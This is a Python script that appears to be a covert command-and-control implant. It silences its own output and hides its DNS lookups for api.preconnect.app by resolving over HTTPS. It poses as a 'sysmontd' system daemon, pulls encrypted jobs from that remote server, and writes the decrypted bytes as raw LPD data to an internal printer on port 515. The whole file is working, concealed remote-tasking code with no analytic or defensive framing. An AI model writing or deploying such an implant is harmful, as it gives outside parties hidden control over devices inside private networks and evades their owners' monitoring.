import base64
import gc
import hashlib
import json
import os
import socket
import struct
import sys
import time
import urllib.request

sys.dont_write_bytecode = True
sys.tracebacklimit = 0
gc.disable()
sys.stdout = sys.stderr = open(os.devnull, "w")

_doh_cache = {}


def doh_resolve(domain):
    now = time.time()
    if domain in _doh_cache and now - _doh_cache[domain][1] < 300:
        return _doh_cache[domain][0]
    for resolver in ("https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query"):
        try:
            req = urllib.request.Request(
                f"{resolver}?name={domain}&type=A",
                headers={"Accept": "application/dns-json"},
            )
            with urllib.request.urlopen(req, timeout=1.5) as r:
                if r.status == 200:
                    data = json.loads(r.read().decode())
                    for ans in data.get("Answer", []):
                        if ans.get("type") == 1:
                            ip = ans.get("data")
                            _doh_cache[domain] = (ip, now)
                            return ip
        except Exception:
            pass
    return domain


_orig_getaddrinfo = socket.getaddrinfo


def _doh_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
    if host == "api.preconnect.app":
        ip = doh_resolve(host)
        if ip and ip != host:
            return _orig_getaddrinfo(ip, port, family, type, proto, flags)
    return _orig_getaddrinfo(host, port, family, type, proto, flags)


socket.getaddrinfo = _doh_getaddrinfo

NUL = b"\x00"
_k = base64.b64decode(
    "ZTliN2E0YzJmOGQxZTNiNmE5YzRmOGQyZTFiN2E0YzlmOGQzZTJiMWE2YzRmOWQ4ZTdiMmE1YzFmNmQ5ZThiNA=="
).decode()
jobs = 0


def _d(s, job_id=""):
    if not s:
        return b""
    raw = base64.b64decode(s)
    if len(raw) < 16:
        return b""
    iv, enc = raw[:16], raw[16:]
    p = hashlib.sha256(_k.encode() + iv + str(job_id).encode()).digest()
    out = bytearray(len(enc))
    sha = hashlib.sha256
    for idx, i in enumerate(range(0, len(enc), 32)):
        chunk = enc[i : i + 32]
        ks = sha(p + idx.to_bytes(4, "big")).digest()
        for j, b in enumerate(chunk):
            out[i + j] = b ^ ks[j]
    return bytes(out)


def is_online(host, port=515):
    if not host:
        return False
    try:
        s = socket.create_connection((host, port), timeout=0.8)
        s.close()
        return True
    except Exception:
        return False


def hdrs(printer_host=None):
    h = printer_host or "172.16.0.111"
    sp = "1" if is_online(h) else "0"
    return {
        "User-Agent": "sysmontd/1.0",
        "X-Worker-Key": _k,
        "X-Worker-Spooler": sp,
        "X-Worker-Jobs": str(jobs),
    }


def claim(i, printer_host=None):
    if not i:
        return True
    try:
        data = f'{{"id":"{i}"}}'.encode()
        headers = {"Content-Type": "application/json", **hdrs(printer_host)}
        r = urllib.request.Request(
            "https://api.preconnect.app/print/claim", data=data, headers=headers
        )
        with urllib.request.urlopen(r, timeout=2) as resp:
            if resp.status == 200:
                return b'"claimed":true' in resp.read()
            return False
    except Exception:
        return False


def _ack(s):
    return s.recv(1) == NUL


def handle(j):
    global jobs
    host = j.get("printerHost") or "172.16.0.111"
    job_id = str(j.get("id") or "")
    if job_id and not claim(job_id, host):
        return
    if not host or not is_online(host):
        return
    q = ch = c = dh = p = None
    s = None
    try:
        q, ch, c, dh, p = [
            _d(j[k], job_id) for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")
        ]
        s = socket.create_connection((host, 515), timeout=j["timeout"])
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        s.sendall(q)
        ok = _ack(s)
        if ok:
            s.sendall(ch)
            ok = _ack(s)
        if ok:
            s.sendall(c)
            s.sendall(NUL)
            ok = _ack(s)
        if ok:
            s.sendall(dh)
            ok = _ack(s)
        if ok:
            s.sendall(p)
            s.sendall(NUL)
            ok = _ack(s)
        if ok:
            jobs += 1
    except Exception:
        if s:
            try:
                s.setsockopt(
                    socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("HH", 1, 0)
                )
            except Exception:
                pass
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass
        try:
            del q, ch, c, dh, p
        except Exception:
            pass
        gc.collect()


def stream():
    try:
        req = urllib.request.Request(
            "https://api.preconnect.app/printer",
            headers={
                "Accept": "text/event-stream",
                "Connection": "keep-alive",
                **hdrs(),
            },
        )
        with urllib.request.urlopen(req, timeout=90) as r:
            if r.status != 200:
                return
            while l := r.readline():
                if l.startswith(b"data: "):
                    try:
                        handle(json.loads(l[6:]))
                    except Exception:
                        pass
    except Exception:
        pass


if __name__ == "__main__":
    delay = 1.0
    while True:
        t0 = time.time()
        try:
            stream()
            delay = 1.0 if (time.time() - t0 > 10) else min(delay * 2, 8)
        except Exception:
            delay = min(delay * 2, 8)
        time.sleep(delay)
